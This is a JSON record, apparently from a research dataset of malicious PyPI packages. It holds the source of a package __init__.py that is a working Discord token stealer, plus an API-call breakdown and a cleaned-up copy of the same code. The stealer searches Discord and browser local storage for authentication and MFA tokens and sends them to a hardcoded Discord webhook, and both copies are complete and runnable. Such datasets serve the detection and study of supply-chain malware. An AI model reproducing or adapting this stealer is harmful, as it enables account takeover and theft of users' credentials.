[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/fijiwashere12323-0.0.0/fijiwashere12323-0.0.0/fijitestinglol12333/__init__.py",
    "code_snippet": "import os,re,json\nfrom urllib.request import Request as F,urlopen as G\nH='https://discord.com/api/webhooks/1040303532609376347/ZLcvVwZdh1dNz6A0HxIgzmJW7HgPz6RAlPishp4HBIsasFai0j3Km8bkS2BhemsEnLtF'\ndef I(path):\n\tA=path;A+='\\Local Storage\\leveldb';C=[]\n\tfor B in os.listdir(A):\n\t\tif not B.endswith('.log')and not B.endswith('.ldb'):continue\n\t\tfor D in [C.strip()for C in open(f'{A}\\{B}',errors='ignore').readlines()if C.strip()]:\n\t\t\tfor E in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}','mfa\\.[\\w-]{84}'):\n\t\t\t\tfor F in re.findall(E,D):C.append(F)\n\treturn C\ndef A():\n\tP='url';C=os.getenv('LOCALAPPDATA');B=os.getenv('APPDATA');J={'Discord':B+'\\Discord','Discord Canary':B+'\\discordcanary','Discord PTB':B+'\\discordptb','Google Chrome':C+'\\Google\\Chrome\\User Data\\Default','Opera':B+'\\Opera Software\\Opera Stable','Brave':C+'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':C+'\\Yandex\\YandexBrowser\\User Data\\Default'};A=''\n\tfor (K,D) in J.items():\n\t\tif not os.path.exists(D):continue\n\t\tA+=f'\n**{K}**\n```\n';E=I(D)\n\t\tif len(E)>0:\n\t\t\tfor L in E:A+=f'{L}\n'\n\t\telse:A+='No tokens found.\\n'\n\t\tA+='```'\n\tM={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'};N=json.dumps({'content':'','embeds':[{'title':'fiji stub','description':f'{A}','color':15329769,'thumbnail':{P:'https://play-lh.googleusercontent.com/jkpabs01pnEU5Jc9U3MuWdwwoWi8v7x33RZNYyLP2T8a2j1csnjOy3_-KI6JU8JntlNW'},'image':{P:'https://hips.hearstapps.com/hmg-prod/images/funny-cat-captions-1563551842.jpg'}}],'attachments':[]})\n\ttry:O=F(H,data=N.encode(),headers=M);G(O)\n\texcept:pass\nif __name__=='__main__':A()",
    "pattern_analysis": {
      "api_sequence": [
        "os.listdir",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.getenv",
        "os.getenv",
        "os.path.exists",
        "open",
        "re.findall",
        "json.dumps",
        "urllib.request.Request",
        "urllib.request.urlopen"
      ],
      "api_sequence_with_args": [
        "os.listdir(A)",
        "open(f'{A}\\{B}', errors='ignore')",
        "os.path.exists(D)",
        "open(f'{A}\\{B}', errors='ignore')",
        "os.path.exists(D)",
        "open(f'{A}\\{B}', errors='ignore')",
        "os.path.exists(D)",
        "open(f'{A}\\{B}', errors='ignore')",
        "os.path.exists(D)",
        "open(f'{A}\\{B}', errors='ignore')",
        "os.path.exists(D)",
        "open(f'{A}\\{B}', errors='ignore')",
        "os.path.exists(D)",
        "open(f'{A}\\{B}', errors='ignore')",
        "os.path.exists(D)",
        "open(f'{A}\\{B}', errors='ignore')",
        "os.path.exists(D)",
        "open(f'{A}\\{B}', errors='ignore')",
        "os.getenv('LOCALAPPDATA')",
        "os.getenv('APPDATA')",
        "os.path.exists(D)",
        "open(f'{A}\\{B}', errors='ignore')",
        "re.findall(E, D)",
        "json.dumps({...})",
        "urllib.request.Request(H, data=N.encode(), headers=M)",
        "urllib.request.urlopen(O)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "import os, re, json\nfrom urllib.request import Request, urlopen\n\nH = 'https://discord.com/api/webhooks/1040303532609376347/ZLcvVwZdh1dNz6A0HxIgzmJW7HgPz6RAlPishp4HBIsasFai0j3Km8bkS2BhemsEnLtF'\n\ndef I(path):\n    A = path\n    A += '\\\\Local Storage\\\\leveldb'\n    C = []\n    for B in os.listdir(A):\n        if not B.endswith('.log') and not B.endswith('.ldb'):\n            continue\n        for D in [C.strip() for C in open(f'{A}\\\\{B}', errors='ignore').readlines() if C.strip()]:\n            for E in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}'):\n                for F in re.findall(E, D):\n                    C.append(F)\n    return C\n\ndef A():\n    P = 'url'\n    C = os.getenv('LOCALAPPDATA')\n    B = os.getenv('APPDATA')\n    J = {\n        'Discord': B + '\\\\Discord',\n        'Discord Canary': B + '\\\\discordcanary',\n        'Discord PTB': B + '\\\\discordptb',\n        'Google Chrome': C + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',\n        'Opera': B + '\\\\Opera Software\\\\Opera Stable',\n        'Brave': C + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n        'Yandex': C + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'\n    }\n    A = ''\n    for (K, D) in J.items():\n        if not os.path.exists(D):\n            continue\n        A += f'\\n**{K}**\\n```\n'\n        E = I(D)\n        if len(E) > 0:\n            for L in E:\n                A += f'{L}\\n'\n        else:\n            A += 'No tokens found.\\n'\n        A += '```'\n    M = {\n        'Content-Type': 'application/json',\n        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'\n    }\n    N = json.dumps({\n        'content': '',\n        'embeds': [\n            {\n                'title': 'fiji stub',\n                'description': f'{A}',\n                'color': 15329769,\n                'thumbnail': {P: 'https://play-lh.googleusercontent.com/jkpabs01pnEU5Jc9U3MuWdwwoWi8v7x33RZNYyLP2T8a2j1csnjOy3_-KI6JU8JntlNW'},\n                'image': {P: 'https://hips.hearstapps.com/hmg-prod/images/funny-cat-captions-1563551842.jpg'}\n            }\n        ],\n        'attachments': []\n    })\n    try:\n        O = Request(H, data=N.encode(), headers=M)\n        urlopen(O)\n    except:\n        pass\n\nif __name__ == '__main__':\n    A()"
    }
  }
]